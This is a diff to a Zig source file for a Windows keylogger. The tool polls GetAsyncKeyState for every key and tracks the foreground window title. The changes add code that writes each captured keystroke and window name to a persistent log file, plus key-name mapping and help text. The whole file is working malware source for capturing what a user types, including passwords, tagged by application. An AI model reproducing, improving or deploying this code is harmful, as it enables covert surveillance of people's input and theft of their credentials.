@@ -1,4 +1,5 @@
 const std = @import("std");
+const Allocator = std.mem.Allocator;
 const ArenaAllocator = std.heap.ArenaAllocator;
 const ArrayList = std.ArrayList;
 const sleep = std.time.sleep;
@@ -11,9 +12,14 @@ const f = std.fmt.bufPrint;
 const cTime = @cImport(@cInclude("time.h"));
 const cWindows = @cImport({
     @cInclude("windows.h");
-    @cInclude("winuser.h");
 });
 const parseInt = std.fmt.parseInt;
+
+const PrevType = enum {
+    init,
+    window,
+    key,
+};
 
 pub fn main() !void {
     var arena = ArenaAllocator.init(std.heap.page_allocator);
@@ -69,18 +75,27 @@ pub fn main() !void {
             try arg_output_path.appendSlice("keylogger.log");
         }
     }
-    if (arg_sleep == 0) {
-        arg_sleep = 3;
+    if (arg_sleep <= 3) {
+        arg_sleep = 10;
     }
     arg_sleep *= std.time.ns_per_ms;
 
     const stdout = std.io.getStdOut().writer();
+    const file_exists = fileExists(allocator, arg_output_path.items);
 
     if (arg_verbose >= 1) {
         try printHeader();
-        try stdout.print("output file: {s}\n", .{arg_output_path.items});
+        try stdout.print("output file exists: {any}\n", .{file_exists});
+        try stdout.print("output file path: {s}\n", .{arg_output_path.items});
         try stdout.print("sleep: {d}\n", .{arg_sleep});
     }
+
+    const dir = std.fs.cwd();
+    var file = try dir.createFile(arg_output_path.items, .{
+        .truncate = false,
+    });
+    defer file.close(); // Actually never reached because of while(true).
+    try file.seekFromEnd(0); // Append to end.
 
     const title_len: usize = 1024;
     const title_len_i: c_uint = @intCast(title_len - 1);
@@ -94,8 +109,10 @@ pub fn main() !void {
     for (0..title_len) |n| ptitle_b[n] = 0;
     for (0..key_len) |n| key_name_b[n] = 0;
 
+    var prev_type: PrevType = .init;
     while (true) {
         sleep(arg_sleep);
+
         const hwnd: cWindows.HWND = cWindows.GetForegroundWindow();
         const ctitle_len = cWindows.GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
         const ctitle_len_u: usize = @intCast(ctitle_len);
@@ -103,9 +120,22 @@ pub fn main() !void {
 
         if (!eql(u8, ptitle_b, ctitle_b)) {
             if (arg_verbose >= 1) {
-                print("new title: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+                print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
             }
+            switch (prev_type) {
+                .init => {
+                    if (file_exists) {
+                        try file.writeAll("\n");
+                    }
+                },
+                .window => {},
+                .key => try file.writeAll("\n"),
+            }
+            try file.writeAll("window: '");
+            try file.writeAll(ctitle_s);
+            try file.writeAll("'\n");
             @memcpy(ptitle_b, ctitle_b);
+            prev_type = .window;
         }
 
         var key_i: u8 = 1;
@@ -113,10 +143,11 @@ pub fn main() !void {
             const key_state: cWindows.SHORT = cWindows.GetAsyncKeyState(key_i);
             if (key_state & 1 != 0) {
                 const key_name_s = getKeyName(key_name_b, key_i);
-                // print("key_state: {d} {d} {d} -> '{s}' ({d}) -> '{s}' ({d})\n", .{ key_i, key_state, key_state & 1, key_name_b, key_name_b.len, key_name_s, key_name_s.len });
                 if (arg_verbose >= 1) {
                     print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                 }
+                try file.writeAll(key_name_s);
+                prev_type = .key;
             }
         }
     }
@@ -133,15 +164,22 @@ fn printHelp() !void {
         \\Usage: keylogger.exe [<options>]
         \\
         \\Options:
-        \\-h, --help         Print this help.
-        \\-v, --verbose      Verbose output.
-        \\-o, --output       Output file path. Accepts datetime format. Default: keylogger.log
-        \\-d, --date         Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
-        \\-s, --sleep        Time to sleep in milliseconds. Default: 3
+        \\-h, --help                Print this help.
+        \\-v, --verbose             Verbose output.
+        \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
+        \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
+        \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
     ;
 
     const stdout = std.io.getStdOut().writer();
     try stdout.print(help, .{});
+}
+
+fn fileExists(allocator: Allocator, path: []const u8) bool {
+    const c_str = allocator.dupeZ(u8, path) catch unreachable;
+    defer allocator.free(c_str); // Not really needed in the context of this program.
+    const attrs = cWindows.GetFileAttributesA(c_str);
+    return attrs != cWindows.INVALID_FILE_ATTRIBUTES;
 }
 
 fn getKeyName(kn: []u8, ki: u8) []u8 {
@@ -153,6 +191,7 @@ fn getKeyName(kn: []u8, ki: u8) []u8 {
         8 => f(kn, "[BACKSPACE]", .{}),
         9 => f(kn, "[TAB]", .{}),
         27 => f(kn, "[ESC]", .{}),
+        32 => f(kn, "[SPACE]", .{}),
         33 => f(kn, "[PAGE UP]", .{}),
         34 => f(kn, "[PAGE DOWN]", .{}),
         35 => f(kn, "[HOME]", .{}),
